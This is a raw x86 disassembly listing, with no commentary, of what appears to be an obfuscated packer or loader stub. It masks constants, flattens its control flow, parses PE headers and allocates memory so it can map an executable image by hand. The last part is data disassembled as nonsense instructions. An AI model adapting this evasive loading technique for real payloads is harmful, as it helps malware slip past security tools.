  41ff5c:	mov    edx,0xf89c8584
  41ff61:	mov    DWORD PTR [ebp-0x8],edx
  41ff64:	mov    eax,DWORD PTR [ebp+0x1c]
  41ff67:	mov    DWORD PTR [ebp+0x1c],eax
  41ff6a:	mov    eax,DWORD PTR [ebp+0x1c]
  41ff6d:	mov    eax,DWORD PTR [eax+0x190]
  41ff73:	mov    eax,DWORD PTR [eax]
  41ff75:	mov    DWORD PTR [ebp-0x24],ecx
  41ff78:	mov    ecx,DWORD PTR [ebp+0x1c]
  41ff7b:	mov    ecx,DWORD PTR [ecx+0x190]
  41ff81:	mov    ecx,DWORD PTR [ecx]
  41ff83:	add    ecx,DWORD PTR [eax+0x3c]
  41ff86:	mov    DWORD PTR [ebp+0x10],ecx
  41ff89:	mov    eax,DWORD PTR [ebp+0x8]
  41ff8c:	xor    eax,edi
  41ff8e:	add    eax,ebx
  41ff90:	mov    DWORD PTR [ebp-0x4],eax
  41ff93:	mov    eax,DWORD PTR [ebp+0x8]
  41ff96:	xor    eax,edi
  41ff98:	add    eax,ebx
  41ff9a:	mov    DWORD PTR [ebp+0x18],eax
  41ff9d:	mov    eax,DWORD PTR [ebp+0x10]
  41ffa0:	mov    eax,DWORD PTR [eax+0x50]
  41ffa3:	sub    eax,0xc
  41ffa6:	mov    DWORD PTR [ebp-0x28],eax
  41ffa9:	mov    eax,DWORD PTR [ebp+0x10]
  41ffac:	mov    eax,DWORD PTR [eax+0x38]
  41ffaf:	mov    ecx,DWORD PTR [ebp+0x10]
  41ffb2:	dec    eax
  41ffb3:	test   DWORD PTR [ecx+0x54],eax
  41ffb6:	mov    eax,DWORD PTR [ebp+0x10]
  41ffb9:	je     0x41ffd3
  41ffbb:	mov    eax,DWORD PTR [eax+0x38]
  41ffbe:	mov    ecx,DWORD PTR [ebp+0x10]
  41ffc1:	mov    ecx,DWORD PTR [ecx+0x54]
  41ffc4:	dec    eax
  41ffc5:	not    eax
  41ffc7:	and    ecx,eax
  41ffc9:	mov    eax,DWORD PTR [ebp+0x10]
  41ffcc:	mov    eax,DWORD PTR [eax+0x38]
  41ffcf:	add    eax,ecx
  41ffd1:	jmp    0x41ffd6
  41ffd3:	mov    eax,DWORD PTR [eax+0x54]
  41ffd6:	mov    DWORD PTR [ebp+0x1c],eax
  41ffd9:	mov    eax,DWORD PTR [ebp+0x8]
  41ffdc:	xor    eax,edi
  41ffde:	add    eax,ebx
  41ffe0:	mov    DWORD PTR [ebp+0x18],eax
  41ffe3:	mov    eax,DWORD PTR [ebp+0x8]
  41ffe6:	xor    eax,edi
  41ffe8:	add    eax,ebx
  41ffea:	mov    DWORD PTR [ebp+0x18],eax
  41ffed:	mov    eax,DWORD PTR [ebp+0x8]
  41fff0:	mov    ecx,DWORD PTR [ebp-0x24]
  41fff3:	xor    eax,edi
  41fff5:	add    eax,ebx
  41fff7:	mov    DWORD PTR [ecx],eax
  41fff9:	mov    DWORD PTR [ebp+0x18],edx
  41fffc:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  420003:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  42000a:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  420011:	mov    eax,DWORD PTR [ebp-0x8]
  420014:	mov    ecx,DWORD PTR [ebp+0x1c]
  420017:	xor    eax,edi
  420019:	add    eax,ebx
  42001b:	imul   eax,ecx
  42001e:	mov    ecx,DWORD PTR [ebp+0x8]
  420021:	mov    edx,DWORD PTR [ebp-0x28]
  420024:	xor    ecx,edi
  420026:	lea    ecx,[ecx+edx*1+0x3272e2]
  42002d:	cmp    eax,ecx
  42002f:	jae    0x4203e0
  420035:	mov    eax,DWORD PTR [ebp+0x8]
  420038:	xor    eax,edi
  42003a:	add    eax,ebx
  42003c:	mov    DWORD PTR [ebp+0x18],eax
  42003f:	mov    eax,DWORD PTR [ebp+0x1c]
  420042:	add    eax,DWORD PTR [ebp-0x1c]
  420045:	mov    DWORD PTR [ebp-0x4],eax
  420048:	push   DWORD PTR [ebp-0x4]
  42004b:	mov    esi,DWORD PTR [ebp-0x1c]
  42004e:	mov    ecx,DWORD PTR [ebp+0x10]
  420051:	call   0x41f149
  420056:	mov    DWORD PTR [ebp+0xc],eax
  420059:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  420060:	mov    eax,DWORD PTR [ebp-0x18]
  420063:	xor    eax,edi
  420065:	lea    ecx,[ebp-0x40]
  420068:	add    eax,ebx
  42006a:	push   ecx
  42006b:	call   0x41f72c
  420070:	mov    eax,DWORD PTR [ebp+0xc]
  420073:	test   eax,eax
  420075:	je     0x4200c5
  420077:	mov    eax,DWORD PTR [ebp-0x18]
  42007a:	xor    eax,edi
  42007c:	add    eax,ebx
  42007e:	push   eax
  42007f:	push   DWORD PTR [ebp+0xc]
  420082:	lea    eax,[ebp-0x40]
  420085:	push   eax
  420086:	call   0x41f5d3
  42008b:	mov    eax,DWORD PTR [ebp-0x4]
  42008e:	mov    DWORD PTR [ebp-0x18],eax
  420091:	mov    eax,DWORD PTR [ebp-0x18]
  420094:	mov    ecx,DWORD PTR [ebp-0x1c]
  420097:	sub    eax,ecx
  420099:	mov    DWORD PTR [ebp-0x18],eax
  42009c:	mov    eax,DWORD PTR [ebp+0xc]
  42009f:	mov    ecx,DWORD PTR [ebp+0xc]
  4200a2:	mov    eax,DWORD PTR [eax+0x10]
  4200a5:	add    eax,DWORD PTR [ecx+0xc]
  4200a8:	mov    ecx,DWORD PTR [ebp-0x18]
  4200ab:	cmp    ecx,eax
  4200ad:	jb     0x4200c5
  4200af:	mov    eax,DWORD PTR [ebp+0xc]
  4200b2:	mov    eax,DWORD PTR [eax+0xc]
  4200b5:	mov    ecx,DWORD PTR [ebp+0xc]
  4200b8:	add    eax,DWORD PTR [ecx+0x8]
  4200bb:	mov    ecx,DWORD PTR [ebp-0x18]
  4200be:	sub    eax,ecx
  4200c0:	jmp    0x4203b3
  4200c5:	push   0xc
  4200c7:	push   DWORD PTR [ebp-0x4]
  4200ca:	lea    eax,[ebp-0x4c]
  4200cd:	push   eax
  4200ce:	call   0x41f5d3
  4200d3:	mov    eax,0xf89c8585
  4200d8:	mov    DWORD PTR [ebp-0x2c],eax
  4200db:	mov    DWORD PTR [ebp-0x30],0xf89c8584
  4200e2:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  4200e9:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  4200f0:	lea    ecx,[ebp-0x2c]
  4200f3:	mov    DWORD PTR [ebp-0xc],ecx
  4200f6:	lea    ecx,[ebp-0x30]
  4200f9:	mov    DWORD PTR [ebp-0x10],ecx
  4200fc:	lea    ecx,[ebp-0x34]
  4200ff:	mov    DWORD PTR [ebp+0xc],ecx
  420102:	lea    ecx,[ebp-0x38]
  420105:	mov    DWORD PTR [ebp-0x14],ecx
  420108:	mov    ecx,DWORD PTR [ebp+0x8]
  42010b:	xor    ecx,edi
  42010d:	add    ecx,ebx
  42010f:	mov    DWORD PTR [ebp-0x18],ecx
  420112:	jmp    0x42030e
  420117:	cmp    eax,0xf89c85bb
  42011c:	je     0x420320
  420122:	mov    ecx,DWORD PTR [ebp-0x8]
  420125:	xor    ecx,edi
  420127:	mov    esi,eax
  420129:	add    ecx,ebx
  42012b:	mov    DWORD PTR [ebp+0x18],ecx
  42012e:	mov    eax,DWORD PTR [ebp-0x18]
  420131:	xor    esi,edi
  420133:	lea    eax,[eax+esi*1+0x3272e2]
  42013a:	mov    DWORD PTR [ebp-0x18],eax
  42013d:	mov    eax,DWORD PTR [ebp-0x8]
  420140:	mov    ecx,DWORD PTR [ebp-0x18]
  420143:	xor    eax,edi
  420145:	add    eax,ebx
  420147:	cmp    ecx,eax
  420149:	jne    0x42015e
  42014b:	mov    eax,DWORD PTR [ebp+0x8]
  42014e:	xor    eax,edi
  420150:	add    eax,ebx
  420152:	push   eax
  420153:	push   0xc
  420155:	lea    eax,[ebp-0x4c]
  420158:	push   eax
  420159:	call   0x41fb60
  42015e:	mov    eax,DWORD PTR [ebp-0xc]
  420161:	mov    eax,DWORD PTR [eax]
  420163:	xor    eax,edi
  420165:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  42016c:	mov    ecx,DWORD PTR [ebp+0x8]
  42016f:	xor    ecx,edi
  420171:	movzx  eax,al
  420174:	add    ecx,ebx
  420176:	cmp    eax,ecx
  420178:	je     0x4202f6
  42017e:	mov    eax,DWORD PTR [ebp-0x10]
  420181:	mov    eax,DWORD PTR [eax]
  420183:	xor    eax,edi
  420185:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  42018c:	mov    ecx,DWORD PTR [ebp+0x8]
  42018f:	xor    ecx,edi
  420191:	movzx  eax,al
  420194:	add    ecx,ebx
  420196:	cmp    eax,ecx
  420198:	je     0x4202f6
  42019e:	mov    eax,DWORD PTR [ebp+0xc]
  4201a1:	mov    eax,DWORD PTR [eax]
  4201a3:	xor    eax,edi
  4201a5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201ac:	mov    ecx,DWORD PTR [ebp+0x8]
  4201af:	xor    ecx,edi
  4201b1:	movzx  eax,al
  4201b4:	add    ecx,ebx
  4201b6:	cmp    eax,ecx
  4201b8:	je     0x4202f6
  4201be:	mov    eax,DWORD PTR [ebp-0x14]
  4201c1:	mov    eax,DWORD PTR [eax]
  4201c3:	xor    eax,edi
  4201c5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4201cf:	xor    ecx,edi
  4201d1:	movzx  eax,al
  4201d4:	add    ecx,ebx
  4201d6:	cmp    eax,ecx
  4201d8:	je     0x4202f6
  4201de:	mov    eax,DWORD PTR [ebp-0x10]
  4201e1:	mov    eax,DWORD PTR [eax]
  4201e3:	xor    eax,edi
  4201e5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201ec:	mov    ecx,DWORD PTR [ebp-0xc]
  4201ef:	mov    ecx,DWORD PTR [ecx]
  4201f1:	xor    ecx,edi
  4201f3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4201fa:	xor    al,cl
  4201fc:	mov    ecx,DWORD PTR [ebp+0xc]
  4201ff:	mov    ecx,DWORD PTR [ecx]
  420201:	xor    ecx,edi
  420203:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42020a:	or     al,cl
  42020c:	mov    ecx,DWORD PTR [ebp-0xc]
  42020f:	mov    ecx,DWORD PTR [ecx]
  420211:	xor    ecx,edi
  420213:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  42021a:	cmp    cl,al
  42021c:	jne    0x4202f6
  420222:	mov    eax,DWORD PTR [ebp+0xc]
  420225:	mov    eax,DWORD PTR [eax]
  420227:	xor    eax,edi
  420229:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  420230:	mov    ecx,DWORD PTR [ebp-0x10]
  420233:	mov    ecx,DWORD PTR [ecx]
  420235:	xor    ecx,edi
  420237:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42023e:	xor    al,cl
  420240:	mov    ecx,DWORD PTR [ebp-0x14]
  420243:	mov    ecx,DWORD PTR [ecx]
  420245:	xor    ecx,edi
  420247:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42024e:	or     al,cl
  420250:	mov    ecx,DWORD PTR [ebp-0x10]
  420253:	mov    ecx,DWORD PTR [ecx]
  420255:	xor    ecx,edi
  420257:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  42025e:	cmp    cl,al
  420260:	jne    0x4202f6
  420266:	mov    eax,DWORD PTR [ebp-0x14]
  420269:	mov    eax,DWORD PTR [eax]
  42026b:	xor    eax,edi
  42026d:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  420274:	mov    ecx,DWORD PTR [ebp+0xc]
  420277:	mov    ecx,DWORD PTR [ecx]
  420279:	xor    ecx,edi
  42027b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  420282:	xor    al,cl
  420284:	mov    ecx,DWORD PTR [ebp-0xc]
  420287:	mov    ecx,DWORD PTR [ecx]
  420289:	xor    ecx,edi
  42028b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  420292:	or     al,cl
  420294:	mov    ecx,DWORD PTR [ebp+0xc]
  420297:	mov    ecx,DWORD PTR [ecx]
  420299:	xor    ecx,edi
  42029b:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  4202a2:	cmp    cl,al
  4202a4:	jne    0x4202f6
  4202a6:	mov    eax,DWORD PTR [ebp-0x14]
  4202a9:	mov    eax,DWORD PTR [eax]
  4202ab:	xor    eax,edi
  4202ad:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4202b4:	mov    ecx,DWORD PTR [ebp-0xc]
  4202b7:	mov    ecx,DWORD PTR [ecx]
  4202b9:	xor    ecx,edi
  4202bb:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4202c2:	xor    al,cl
  4202c4:	mov    ecx,DWORD PTR [ebp-0x10]
  4202c7:	mov    ecx,DWORD PTR [ecx]
  4202c9:	xor    ecx,edi
  4202cb:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4202d2:	or     al,cl
  4202d4:	mov    ecx,DWORD PTR [ebp-0x14]
  4202d7:	mov    ecx,DWORD PTR [ecx]
  4202d9:	xor    ecx,edi
  4202db:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  4202e2:	cmp    cl,al
  4202e4:	jne    0x4202f6
  4202e6:	lea    eax,[ebp-0x4c]
  4202e9:	push   eax
  4202ea:	call   0x41fdb1
  4202ef:	mov    ecx,DWORD PTR [ebp-0x44]
  4202f2:	cmp    eax,ecx
  4202f4:	je     0x420300
  4202f6:	mov    eax,DWORD PTR [ebp+0x8]
  4202f9:	xor    eax,edi
  4202fb:	add    eax,ebx
  4202fd:	mov    DWORD PTR [ebp+0x18],eax
  420300:	mov    eax,DWORD PTR [ebp-0x8]
  420303:	xor    eax,edi
  420305:	lea    eax,[eax+esi*1+0x3272e2]
  42030c:	xor    eax,edi
  42030e:	mov    ecx,DWORD PTR [ebp+0x8]
  420311:	mov    edx,DWORD PTR [ebp+0x18]
  420314:	xor    ecx,edi
  420316:	add    ecx,ebx
  420318:	cmp    edx,ecx
  42031a:	je     0x420117
  420320:	mov    eax,DWORD PTR [ebp+0x8]
  420323:	mov    ecx,DWORD PTR [ebp+0x18]
  420326:	xor    eax,edi
  420328:	add    eax,ebx
  42032a:	cmp    ecx,eax
  42032c:	jne    0x42033f
  42032e:	mov    eax,DWORD PTR [ebp-0x8]
  420331:	mov    ecx,DWORD PTR [ebp+0x1c]
  420334:	xor    eax,edi
  420336:	lea    eax,[eax+ecx*1+0x3272e2]
  42033d:	jmp    0x4203b6
  42033f:	push   0x18
  420341:	push   DWORD PTR [ebp-0x4]
  420344:	lea    eax,[ebp-0x64]
  420347:	push   eax
  420348:	call   0x41f5d3
  42034d:	mov    eax,DWORD PTR [ebp+0x8]
  420350:	mov    ecx,DWORD PTR [ebp-0x18]
  420353:	xor    eax,edi
  420355:	add    eax,ebx
  420357:	cmp    eax,ecx
  420359:	je     0x42036e
  42035b:	mov    eax,DWORD PTR [ebp+0x8]
  42035e:	xor    eax,edi
  420360:	add    eax,ebx
  420362:	push   eax
  420363:	push   0x18
  420365:	lea    eax,[ebp-0x64]
  420368:	push   eax
  420369:	call   0x41fb60
  42036e:	mov    eax,DWORD PTR [ebp-0x4]
  420371:	add    eax,0x18
  420374:	mov    DWORD PTR [ebp+0x18],eax
  420377:	push   DWORD PTR [ebp-0x50]
  42037a:	push   DWORD PTR [ebp+0x18]
  42037d:	mov    eax,DWORD PTR [ebp-0x54]
  420380:	add    eax,DWORD PTR [ebp-0x20]
  420383:	push   eax
  420384:	call   0x41f5d3
  420389:	mov    eax,DWORD PTR [ebp+0x8]
  42038c:	mov    ecx,DWORD PTR [ebp-0x18]
  42038f:	xor    eax,edi
  420391:	add    eax,ebx
  420393:	cmp    eax,ecx
  420395:	je     0x4203a8
  420397:	push   0x0
  420399:	push   DWORD PTR [ebp-0x50]
  42039c:	mov    eax,DWORD PTR [ebp-0x54]
  42039f:	add    eax,DWORD PTR [ebp-0x20]
  4203a2:	push   eax
  4203a3:	call   0x41fb60
  4203a8:	mov    eax,DWORD PTR [ebp-0x24]
  4203ab:	mov    ecx,DWORD PTR [ebp-0x50]
  4203ae:	add    DWORD PTR [eax],ecx
  4203b0:	mov    eax,DWORD PTR [ebp-0x50]
  4203b3:	add    eax,DWORD PTR [ebp+0x1c]
  4203b6:	mov    DWORD PTR [ebp+0x1c],eax
  4203b9:	mov    eax,DWORD PTR [ebp-0x8]
  4203bc:	mov    ecx,DWORD PTR [ebp+0x1c]
  4203bf:	xor    eax,edi
  4203c1:	add    eax,ebx
  4203c3:	imul   eax,ecx
  4203c6:	mov    ecx,DWORD PTR [ebp+0x8]
  4203c9:	mov    edx,DWORD PTR [ebp-0x28]
  4203cc:	xor    ecx,edi
  4203ce:	lea    ecx,[ecx+edx*1+0x3272e2]
  4203d5:	cmp    eax,ecx
  4203d7:	jb     0x420035
  4203dd:	mov    esi,DWORD PTR [ebp+0x14]
  4203e0:	mov    eax,DWORD PTR [ebp-0x20]
  4203e3:	mov    DWORD PTR [esi],eax
  4203e5:	jmp    0x42042c
  4203e7:	mov    ecx,DWORD PTR [ebp+0x8]
  4203ea:	mov    edx,DWORD PTR [ebp+0xc]
  4203ed:	xor    ecx,edi
  4203ef:	xor    edx,edi
  4203f1:	add    ecx,ebx
  4203f3:	add    edx,ebx
  4203f5:	cmp    ecx,edx
  4203f7:	jne    0x42040b
  4203f9:	mov    eax,ds:0x7f642d1e
  4203fe:	imul   eax,eax,0x9f15fcef
  420404:	mov    ds:0x7f642d1e,eax
  420409:	jmp    0x42042c
  42040b:	mov    ecx,DWORD PTR [ebp+0x8]
  42040e:	xor    ecx,edi
  420410:	add    ecx,ebx
  420412:	cmp    eax,ecx
  420414:	je     0x420422
  420416:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  420420:	jmp    0x42042c
  420422:	and    DWORD PTR ds:0x3343fa1e,0x5265ec3f
  42042c:	pop    edi
  42042d:	pop    esi
  42042e:	pop    ebx
  42042f:	leave  
  420430:	ret    0x18
  420433:	push   ebp
  420434:	mov    ebp,esp
  420436:	and    esp,0xfffffff8
  420439:	mov    eax,DWORD PTR [ebp+0x20]
  42043c:	sub    esp,0x14
  42043f:	push   ebx
  420440:	mov    ebx,DWORD PTR [ebp+0x14]
  420443:	push   esi
  420444:	push   edi
  420445:	cmp    eax,0xf89c8585
  42044a:	jne    0x420456
  42044c:	push   0xf89c8584
  420451:	jmp    0x420588
  420456:	mov    eax,DWORD PTR [ebp+0x20]
  420459:	cmp    eax,0xf89c8584
  42045e:	jne    0x42046a
  420460:	push   0xf89c85bb
  420465:	jmp    0x420588
  42046a:	mov    eax,DWORD PTR [ebp+0x20]
  42046d:	cmp    eax,0xf89c85bb
  420472:	jne    0x42047e
  420474:	push   0xf89c85ba
  420479:	jmp    0x420588
  42047e:	mov    eax,DWORD PTR [ebp+0x20]
  420481:	cmp    eax,0xf89c85ba
  420486:	jne    0x420492
  420488:	push   0xf89c85b9
  42048d:	jmp    0x420588
  420492:	mov    ecx,DWORD PTR [ebp+0x20]
  420495:	mov    eax,0xf89c85be
  42049a:	cmp    ecx,eax
  42049c:	jne    0x420558
  4204a2:	mov    eax,DWORD PTR [ebp+0x10]
  4204a5:	mov    DWORD PTR [esp+0xc],eax
  4204a9:	mov    eax,DWORD PTR [ebp+0x18]
  4204ac:	mov    DWORD PTR [esp+0x14],eax
  4204b0:	mov    eax,DWORD PTR [ebp+0xc]
  4204b3:	mov    DWORD PTR [esp+0x18],eax
  4204b7:	mov    eax,DWORD PTR [ebp+0x8]
  4204ba:	mov    DWORD PTR [esp+0x10],eax
  4204be:	mov    eax,DWORD PTR [esp+0x10]
  4204c2:	mov    ecx,DWORD PTR [esp+0x14]
  4204c6:	mov    edi,0x751089b
  4204cb:	xor    eax,edi
  4204cd:	mov    esi,0x3272e2
  4204d2:	add    eax,esi
  4204d4:	mov    DWORD PTR [ecx],eax
  4204d6:	mov    eax,DWORD PTR [esp+0xc]
  4204da:	mov    eax,DWORD PTR [eax+0x194]
  4204e0:	mov    ecx,DWORD PTR [eax]
  4204e2:	mov    eax,DWORD PTR [esp+0xc]
  4204e6:	mov    eax,DWORD PTR [eax+0x194]
  4204ec:	mov    eax,DWORD PTR [eax]
  4204ee:	add    eax,DWORD PTR [ecx+0x3c]
  4204f1:	mov    ecx,DWORD PTR [esp+0xc]
  4204f5:	mov    ecx,DWORD PTR [ecx+0x1d8]
  4204fb:	mov    ecx,DWORD PTR [ecx+0x14]
  4204fe:	push   0x4
  420500:	push   0x3000
  420505:	push   DWORD PTR [eax+0x50]
  420508:	push   0x0
  42050a:	call   ecx
  42050c:	mov    DWORD PTR [ebx],eax
  42050e:	mov    eax,DWORD PTR [esp+0x10]
  420512:	push   DWORD PTR [esp+0xc]
  420516:	xor    eax,edi
  420518:	add    eax,esi
  42051a:	mov    DWORD PTR [esp+0x20],eax
  42051e:	lea    eax,[esp+0x20]
  420522:	push   eax
  420523:	push   ebx
  420524:	push   DWORD PTR [esp+0x20]
  420528:	push   DWORD PTR [esp+0x28]
  42052c:	push   DWORD PTR [esp+0x24]
  420530:	call   0x41fef5
  420535:	mov    eax,DWORD PTR [esp+0x10]
  420539:	mov    ecx,DWORD PTR [ebx]
  42053b:	xor    eax,edi
  42053d:	add    eax,esi
  42053f:	cmp    ecx,eax
  420541:	je     0x42059f
  420543:	mov    eax,DWORD PTR [esp+0x18]
  420547:	mov    ecx,DWORD PTR [esp+0x14]
  42054b:	xor    eax,edi
  42054d:	add    eax,esi
  42054f:	imul   eax,DWORD PTR [esp+0x1c]
  420554:	mov    DWORD PTR [ecx],eax
  420556:	jmp    0x42059f
  420558:	mov    ecx,DWORD PTR [ebp+0x20]
  42055b:	cmp    ecx,0xf89c85b9
  420561:	jne    0x42056a
  420563:	push   0xf89c85b8
  420568:	jmp    0x420588
  42056a:	mov    ecx,DWORD PTR [ebp+0x20]
  42056d:	cmp    ecx,0xf89c85b8
  420573:	jne    0x42057c
  420575:	push   0xf89c85bf
  42057a:	jmp    0x420588
  42057c:	mov    ecx,DWORD PTR [ebp+0x20]
  42057f:	cmp    ecx,0xf89c85bf
  420585:	jne    0x42059f
  420587:	push   eax
  420588:	push   DWORD PTR [ebp+0x1c]
  42058b:	push   DWORD PTR [ebp+0x18]
  42058e:	push   ebx
  42058f:	push   DWORD PTR [ebp+0x10]
  420592:	push   DWORD PTR [ebp+0xc]
  420595:	push   DWORD PTR [ebp+0x8]
  420598:	call   0x420433
  42059d:	mov    DWORD PTR [ebx],eax
  42059f:	mov    eax,DWORD PTR [ebx]
  4205a1:	pop    edi
  4205a2:	pop    esi
  4205a3:	pop    ebx
  4205a4:	mov    esp,ebp
  4205a6:	pop    ebp
  4205a7:	ret    0x1c
  4205aa:	push   ebp
  4205ab:	mov    ebp,esp
  4205ad:	sub    esp,0xc
  4205b0:	mov    eax,0xf89c8585
  4205b5:	mov    DWORD PTR [ebp-0x8],eax
  4205b8:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4205bf:	mov    ecx,DWORD PTR [ebp-0x8]
  4205c2:	xor    ecx,0x751089b
  4205c8:	add    ecx,0x3272e2
  4205ce:	mov    DWORD PTR [ebp-0x4],ecx
  4205d1:	mov    ecx,DWORD PTR [ebp+0xc]
  4205d4:	push   eax
  4205d5:	mov    DWORD PTR [ebp+0xc],ecx
  4205d8:	push   DWORD PTR [ebp+0xc]
  4205db:	lea    eax,[ebp-0x4]
  4205de:	push   DWORD PTR [ebp+0x8]
  4205e1:	push   eax
  4205e2:	push   DWORD PTR [ebp+0xc]
  4205e5:	push   DWORD PTR [ebp-0xc]
  4205e8:	push   DWORD PTR [ebp-0x8]
  4205eb:	call   0x420433
  4205f0:	mov    DWORD PTR [ebp-0x4],eax
  4205f3:	mov    eax,DWORD PTR [ebp-0x4]
  4205f6:	leave  
  4205f7:	ret    0x8
  4205fa:	jg     0x4205b0
  4205fc:	jge    0xf741c5d1
  420602:	add    ebp,DWORD PTR [eax-0xa]
  420605:	gs sbb si,di
  420609:	mov    al,0x8
  42060b:	add    DWORD PTR [ecx],0x0
  42060e:	std    
  42060f:	add    DWORD PTR [eax],eax
  420611:	add    BYTE PTR [ebx+0x55beefd2],dl
  420617:	test   DWORD PTR [esi+0x6c30f2d3],ebx
  42061d:	fcomp  DWORD PTR [ebx+0x26d0ade7]
  420623:	std    
  420624:	shl    edx,cl
  420626:	ss push ecx
  420628:	popf   
  420629:	repnz div DWORD PTR [edi]
  42062c:	imul   esp,DWORD PTR [ecx],0x9e3a060d
  420632:	jle    0x42062c
  420634:	jnp    0x4205e7
  420636:	xchg   ebx,eax
  420637:	lods   al,BYTE PTR ds:[esi]
  420638:	fcomp  DWORD PTR [ecx]
  42063a:	push   ebp
  42063b:	inc    edi
  42063c:	adc    esi,DWORD PTR [ebx+esi*8]
  42063f:	lds    ecx,FWORD PTR [esi-0x52]
  420642:	adc    eax,0x87d4e9e3
  420647:	jmp    0x42062c
  420649:	jl     0x42068b
  42064b:	xchg   esp,eax
  42064c:	jle    0x420626
  42064e:	(bad)  
  42064f:	fxch   st(2)
  420651:	rol    DWORD PTR [edx+0x4607b317],0x1c
  420658:	aad    0x72
  42065a:	push   ebx
  42065b:	call   0x2286:0x77258dd0
  420662:	outs   dx,DWORD PTR ds:[esi]
  420663:	daa    
  420664:	mov    cs,WORD PTR [esi-0x21]
  420667:	repnz pop eax
  420669:	xchg   ebx,eax
  42066a:	shr    BYTE PTR [ecx],0xd2
  42066d:	les    ecx,FWORD PTR [ecx]
  42066f:	(bad)
  420673:	lea    edx,ss:[edx]
  420676:	dec    esp
  420677:	ja     0x420610
  420679:	and    eax,0xaa0a19ad
  42067e:	push   es
  42067f:	pop    esi
  420680:	pop    edx
  420681:	pop    ss
  420682:	mov    ds,WORD PTR [edx+0x328c8701]
  420688:	out    dx,al
  420689:	or     eax,0xcb2b157e
  42068e:	int3   
  42068f:	and    esi,ecx
  420691:	fmul   QWORD PTR [edx+edx*2-0xcde4870]
  420698:	push   eax
  420699:	xchg   esp,eax
  42069a:	cdq    
  42069b:	sbb    al,0xc1
  42069d:	fdiv   DWORD PTR [edi]
  42069f:	add    ecx,DWORD PTR [esi-0x58fc36d3]
  4206a5:	sub    ebx,eax
  4206a7:	je     0x42065d
  4206a9:	inc    esp
  4206aa:	or     al,dh
  4206ac:	test   DWORD PTR [ebp+0x21],ecx
  4206af:	jo     0x420676
  4206b1:	lock jne 0x4206f6
  4206b4:	mov    al,0xf
  4206b6:	mov    eax,ds:0x20b67292
  4206bb:	mov    bl,0x1e
  4206bd:	je     0x4206ef
  4206bf:	add    al,0x7
  4206c1:	inc    eax
  4206c2:	sbb    eax,0x9872e47a
  4206c7:	and    eax,0xfb0e5b9d
  4206cc:	xchg   ebx,eax
  4206cd:	and    edi,ecx
  4206cf:	add    DWORD PTR [esi+0x10db048a],esp
  4206d5:	mov    ds:0x4d951f02,eax
  4206da:	mov    al,0x7f
  4206dc:	mov    al,al
  4206de:	add    ebx,DWORD PTR ds:0x780e1c18
  4206e4:	mov    ah,ah
  4206e6:	or     BYTE PTR [ebp+0x2e2e6589],dl
  4206ec:	mov    eax,0x18f28e38
  4206f1:	jg     0x42074c
  4206f3:	add    cl,cl
  4206f5:	mov    eax,0x16161006
  4206fa:	adc    al,0x9e
  4206fc:	fisttp WORD PTR [ecx]
  4206fe:	fistp  WORD PTR [ecx]
  420700:	pop    ebx
  420701:	shl    BYTE PTR [edx+0x5f],cl
  420704:	lock ja 0x42073f
  420707:	cmp    ah,BYTE PTR [esi+0x51]
  42070a:	or     al,0x12
  42070c:	or     bl,BYTE PTR [eax-0x7]
  42070f:	sub    al,0x77
  420711:	mov    edx,0x467ebc47
  420716:	inc    edx
  420717:	xor    edx,DWORD PTR [ecx-0x76]
  42071a:	nop
  42071b:	xor    al,0x56
  42071d:	mov    al,ds:0x625f473d
  420722:	loope  0x42077b
  420724:	sub    eax,0x6b75e02c
  420729:	adc    bh,al
  42072b:	aam    0x46
  42072d:	int    0x4f
  42072f:	jb     0x420748
  420731:	mov    ds:0x319cbff3,al
  420736:	jno    0x420799
  420738:	orps   xmm6,XMMWORD PTR [ecx+0x21bd85f4]
  42073f:	cdq    
  420740:	mov    al,0x66
  420742:	xor    DWORD PTR [ecx+eiz*8+0x24],ebx
  420746:	sti    
  420747:	jmp    0x420701
  420749:	add    al,0x37
  42074b:	mov    al,ds:0x9d582f5a
  420750:	mov    edx,0x6ba61709
  420755:	inc    ebx
  420756:	ja     0x4206e7
  420758:	lahf   
  420759:	xchg   edx,eax
  42075a:	ror    BYTE PTR [ebx-0x485b7ba9],1
  420760:	xchg   ebx,eax
  420761:	lods   eax,DWORD PTR ds:[esi]
  420762:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420763:	xchg   ebp,eax
  420764:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420765:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420766:	call   0x82c6:0xf2efe27
  42076d:	inc    esp
  42076e:	xchg   edi,eax
  42076f:	push   edx
  420770:	icebp  
  420771:	cdq    
  420772:	in     eax,dx
  420773:	or     bh,BYTE PTR ds:0x3c34b9d4
  420779:	push   ecx
  42077a:	sbb    al,0x0
  42077c:	cli    
  42077d:	stos   BYTE PTR es:[edi],al
  42077e:	sbb    bl,bh
  420780:	gs loop 0x4207fc
  420783:	inc    ebp
  420784:	sbb    al,0x9c
